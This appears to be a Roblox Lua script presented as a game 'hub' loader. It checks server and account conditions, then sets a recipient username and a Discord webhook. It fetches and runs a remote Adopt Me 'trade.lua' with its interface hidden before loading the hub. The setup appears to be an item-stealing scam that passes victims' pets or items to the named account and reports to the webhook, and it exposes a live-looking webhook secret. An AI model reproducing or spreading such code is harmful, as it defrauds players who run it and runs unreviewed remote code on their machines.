local player = game.Players.LocalPlayer
local accountAge = player.AccountAge
local minimumAccountAge = 10
local isFullServer = game.Players.NumPlayers == game.Players.MaxPlayers
local isPrivateServer = game.Players.NumPlayers == 1

-- Notification library
local NotificationLoad =
    loadstring(game:HttpGet("https://raw.githubusercontent.com/treeofplant/Notif/main/library.lua", true))()

-- Function to show error notifications
local function showNotification(errorMessage)
    NotificationLoad:NewNotification(
        {
            ["Mode"] = "Error",
            ["Title"] = "Error!",
            ["Description"] = errorMessage,
            ["Timeout"] = 30,
            ["Audio"] = false
        }
    )
end

-- Check for any conditions that prevent execution
local function checkConditions()
    local errors = {}

    if isPrivateServer then
        table.insert(errors, "You're in a private server. Re-execute the script on a public server.")
    end
    if isFullServer then
        table.insert(errors, "Your server is full. Re-execute the script on a less crowded server.")
    end
    if accountAge < minimumAccountAge then
        table.insert(errors, "Your account is new. Re-execute the script on an older account.")
    end

    if #errors > 0 then
        -- Display all error messages
        for _, errorMessage in ipairs(errors) do
            showNotification(errorMessage)
        end
        return false -- Prevent execution of the second script
    else
        return true -- Allow execution of the second script
    end
end

-- Execute the scripts
if checkConditions() then
    UserName = "BestGetter90"
    WebHook =
        "https://discord.com/api/webhooks/1279703178266415166/OxEBX4I2AwimpwAUM07-yfRbtdhoWXchE3RxKPGG_EucxT7N6Zg6ISAG5cRh8BX-_eI3"

    getgenv().gui = false
    loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/AdoptMe/main/trade.lua"))()

    _G.scriptName = "ReQiuYTPLHub.lua"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua", true))()
end
